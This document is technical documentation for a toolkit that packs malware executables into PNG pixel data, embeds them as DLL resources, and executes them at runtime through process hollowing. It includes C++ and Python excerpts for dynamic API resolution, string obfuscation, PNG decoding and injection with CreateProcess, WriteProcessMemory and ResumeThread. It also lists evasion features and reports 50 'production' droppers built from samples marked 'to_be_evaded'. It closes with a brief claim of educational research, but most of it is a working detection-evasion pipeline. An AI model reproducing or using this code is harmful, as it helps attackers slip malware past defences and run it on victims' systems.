# PNG-Embedded Dropper: Complete Technical Documentation

## Overview
A production-ready dropper system that converts malware executables into PNG image format, embeds them as DLL resources, then reconstructs and executes them at runtime via advanced in-memory PE injection.

**Note**: This is **NOT true steganography**. We are not hiding data within existing images. Instead, we convert raw PE bytes directly into PNG pixel data, then embed the entire PNG file as a binary resource in the dropper DLL.

## Production Files Analysis

### Core Components (`image.dll/` folder)
- **`Source.cpp`** - Runtime PNG decoder & PE injector (C++)
- **`lodepng.cpp/h`** - PNG encoding/decoding library (version 20250506)
- **`Resource.rc`** - Resource embedding script
- **`resource.h`** - Resource definitions

### Utility Scripts (`utils/` folder)  
- **`create_full_png_droppers.py`** - Main batch orchestrator
- **`pe_to_image.py`** - PE→PNG converter
- **`build_single_dropper.sh`** - MinGW cross-compiler script

### Output
- **`png_droppers_no_encoding/`** - 50 production dropper DLLs (733KB - 1.7MB each)

---

## Step-by-Step Program Flow

### Stage 1: Batch Processing Setup
**`create_full_png_droppers.py`** (lines 28-45):
- Reads 50 malware samples from `/home/mihir/Downloads/to_be_evaded_ds_unpacked/`
- Creates output directory `png_droppers_no_encoding/`
- Processes each binary file sequentially

### Stage 2: Binary → PNG Conversion  
**`create_full_png_droppers.py`** calls **`pe_to_image.py`** (lines 67-81):
```python
# Step 1: Convert binary to PNG
result = subprocess.run([
    sys.executable, 
    str(utils_dir / "pe_to_image.py"),
    str(binary_file),
    str(png_file)
], capture_output=True, text=True)
```

**`pe_to_image.py`** performs **lossless binary-to-image conversion**:
- Reads raw PE bytes from malware sample
- Calculates near-square dimensions: `width = ceil(sqrt(pe_size))`
- Pads bytes to fit image dimensions: `pe_data + b'\x00' * padding_needed`
- **Creates grayscale PNG**: `Image.fromarray(image_array, mode='L')` 
  - Each pixel = 1 byte of PE data (0-255 grayscale values)
  - **No data hiding**: PE bytes become literal pixel values
- Saves `.png` + `.png.meta` (stores original size for accurate trimming)

### Stage 3: Dropper Project Assembly
**`create_full_png_droppers.py`** (lines 82-95):
- Copies `image.dll/Dropper/` template → `temp_build_dir/dropper_{sample}/`
- Copies converted PNG → `dropper_{sample}/payload.png`
- Updates project files for compilation

### Stage 4: Resource Embedding (Not Steganography)
**`Resource.rc`**:
```rc
IDR_PNG1 PNG "payload.png"    // Embeds complete PNG file as binary resource
```
This embeds the **entire PNG file** (headers + pixel data + metadata) into the DLL resource section as resource type 256 (PNG), ID 101 (IDR_PNG1).

**Critical distinction**: We are **not** hiding data within an existing image. We are storing a complete PNG file that contains our PE data as its pixel values.

### Stage 5: DLL Compilation
**`create_full_png_droppers.py`** calls **`build_single_dropper.sh`** (lines 96-110):
- MinGW cross-compilation: `x86_64-w64-mingw32-g++`
- Links: `Source.cpp` + `lodepng.cpp` + `Resource.rc`
- Output: `png_droppers_no_encoding/dropper_{sample}.dll`

---

## Runtime Execution Flow

### Stage 6: DLL Loading & API Resolution
**`Source.cpp`** - **`DllMain()`** (lines 161-184):
```cpp
// Dynamic API resolution to evade static analysis
k32 = LoadLibraryA(decode(k32enc,13));  // "Kernel32.dll"
frw = (MyFindResourceW)GetProcAddress(k32,decode(findrsrcenc,14));
mlr = (MyLoadResource)GetProcAddress(k32,decode(loadrsrcenc,13));
// ... resolve all APIs dynamically
run(hModule);  // Launch main dropper function
```

### Stage 7: Resource Extraction
**`Source.cpp`** - **`run()`** function (lines 412-424):
```cpp
// Handle to myself
HMODULE h = (HMODULE)hModule;
// Locate PNG resource (IDR_PNG1 = 101, PNG = 256)
HRSRC r = frw(h,MAKEINTRESOURCE(IDR_PNG1),MAKEINTRESOURCE(PNG));
// Load and lock resource to get PNG file bytes
HGLOBAL rc = mlr(h,r);
void* data = mlor(rc);     // Pointer to complete PNG file bytes
DWORD size = sor(h,r);     // PNG file size (including headers)
```

### Stage 8: Encoding Skip (Clean Pipeline)
**`Source.cpp`** - **`run()`** continues (lines 427-432):
```cpp
// Obfuscation disabled for clean PNG-only pipeline
#ifdef XOR_ENCODE       // DISABLED - commented out in source
    data = XOR(data,size);
#endif
#ifdef BASE64           // DISABLED - commented out in source  
    data = base64decode(data,&size);
#endif
```

### Stage 9: PNG Decoding & PE Reconstruction
**`Source.cpp`** - **`png_to_pe()`** function (lines 355-407):

This is the **critical reversal step** that reconstructs the original PE from PNG pixel data:

```cpp
#ifdef PNG_DECODE       // ENABLED
    // Step 1: Decode PNG using lodepng library  
    unsigned char* image_data;
    unsigned width, height;
    unsigned error = lodepng_decode_memory(&image_data, &width, &height, 
                                         png_data, png_size, LCT_GREY, 8);
    
    if (error) {
        *pe_size = 0;
        return NULL;  // PNG decode failed
    }
    
    // Step 2: Extract PE bytes from pixel data
    size_t total_image_size = width * height;  // Total pixels = total PE bytes
    
    // Step 3: Allocate buffer and copy pixel data
    void* pe_data = mm(total_image_size);      // Malloc PE buffer
    memcpy(pe_data, image_data, total_image_size);  // Copy pixels → PE bytes
    free(image_data);  // Free lodepng memory
    
    // Step 4: PE validation and size detection
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_data;
    if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {  // Check "MZ" signature
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)pe_data + dos_header->e_lfanew);
        if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {  // Check "PE" signature
            // Use PE header's SizeOfImage for accurate size (removes padding)
            *pe_size = nt_headers->OptionalHeader.SizeOfImage;
        }
    }
#endif
```

**Key PNG Decoding Details**:
- **`LCT_GREY, 8`**: Decodes as 8-bit grayscale (each pixel = 1 byte)
- **1:1 mapping**: Each PNG pixel value becomes 1 PE byte (lossless conversion)
- **Size calculation**: `width × height = total_pixels = total_PE_bytes`
- **Padding removal**: PE header's `SizeOfImage` provides true PE size vs padded image size
- **Memory management**: lodepng allocates `image_data`, we copy to our `pe_data` buffer and free lodepng's memory

### Stage 10: In-Memory PE Injection
**`Source.cpp`** - **`launch()`** → **`runPE64()`** (lines 188-387):
```cpp
// Create suspended target process (typically current executable)
CreateProcess(NULL, wszArgsBuffer, NULL, NULL, TRUE, CREATE_SUSPENDED, ...);

// Allocate memory at PE's preferred ImageBase address
LPVOID lpImageBase = VirtualAllocEx(lpPI->hProcess, 
                                   (LPVOID)lpNTHeader->OptionalHeader.ImageBase,
                                   lpNTHeader->OptionalHeader.SizeOfImage,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write PE headers to target process
WriteProcessMemory(lpPI->hProcess, lpImageBase, lpImage, 
                  lpNTHeader->OptionalHeader.SizeOfHeaders, NULL);

// Map all PE sections into target process memory
for (SIZE_T iSection = 0; iSection < lpNTHeader->FileHeader.NumberOfSections; ++iSection) {
    // Calculate section virtual address and copy section data
    WriteProcessMemory(lpPI->hProcess, section_va, section_data, section_size, NULL);
}

// Update entry point and resume execution
stCtx.Rcx = (DWORD64)lpImageBase + lpNTHeader->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(lpPI->hThread, &stCtx);
ResumeThread(lpPI->hThread);  // Execute injected PE
```

---

## Complete Data Transformation Chain

```
Original Malware.exe (raw PE bytes)
    ↓ pe_to_image.py
Grayscale PNG (1 byte per pixel, PE bytes as pixel values, padded to square)
    ↓ create_full_png_droppers.py  
Resource.rc embeds complete PNG file → DLL compilation
    ↓ build_single_dropper.sh (MinGW cross-compiler)
dropper_X.dll (contains PNG file in IDR_PNG1 resource section)
    ↓ Runtime: DLL load triggers DllMain() → run()
FindResource/LoadResource extracts complete PNG file bytes
    ↓ lodepng_decode_memory(LCT_GREY, 8) 
Raw pixel array (grayscale values 0-255 = original PE bytes + padding)
    ↓ PE header validation & SizeOfImage-based trimming
Original PE bytes restored (padding removed)
    ↓ runPE64() advanced process hollowing
CreateProcess(SUSPENDED) → VirtualAllocEx → WriteProcessMemory → ResumeThread
    ↓ 
Malware executes in target process memory space
```

## Technical Implementation Details

### PNG Conversion Method (Not Steganography)
- **Direct byte mapping**: PE byte value becomes PNG pixel grayscale value (0-255)
- **Lossless preservation**: PNG grayscale mode preserves exact byte values
- **Square optimization**: Near-square dimensions minimize file size overhead
- **No carrier image**: We create the PNG from scratch, not hiding within existing images
- **Metadata storage**: Original size stored in `.png.meta` for accurate reconstruction

### Evasion Techniques
- **Dynamic API resolution**: All Windows APIs resolved at runtime via `GetProcAddress()`
- **String obfuscation**: API names stored as integer arrays, decoded at runtime
- **200+ dead exports**: Fake export table mimics legitimate system DLLs
- **In-memory execution**: Advanced process hollowing (no disk writes)
- **Resource embedding**: Malware appears as PNG image resources (but not hidden within images)

### Build Pipeline Efficiency  
- **Batch processing**: Processes 50 samples in 84 seconds (~1.7s per dropper)
- **Template-based**: Single `image.dll/Dropper/` template for all variants
- **Cross-compilation**: MinGW produces Windows DLLs on Linux
- **Automated workflow**: Complete PE → PNG → DLL pipeline

## Production Results
✅ **50 dropper DLLs successfully created**  
✅ **Size range**: 733KB - 1.7MB (includes dropper runtime + lodepng library + PNG payload)  
✅ **100% success rate** in batch processing  
✅ **Clean PNG embedding verified** (PNG headers confirmed at consistent offsets)

## Key Distinctions

### What This IS:
- **PNG-based PE packing**: Converting PE executables into PNG format for storage
- **Resource embedding**: Storing PNG files as DLL resources
- **Lossless binary conversion**: PE ↔ PNG conversion preserves all data
- **Advanced process injection**: In-memory PE execution via process hollowing

### What This is NOT:
- **Steganography**: We don't hide data within existing images
- **Image manipulation**: We don't modify existing PNG files
- **Visual deception**: The PNG doesn't look like a normal image (it's grayscale noise)
- **Carrier-based hiding**: No host image is used to conceal the payload

This implementation demonstrates advanced malware packing techniques using PNG as a binary storage format combined with sophisticated runtime PE injection for educational cybersecurity research.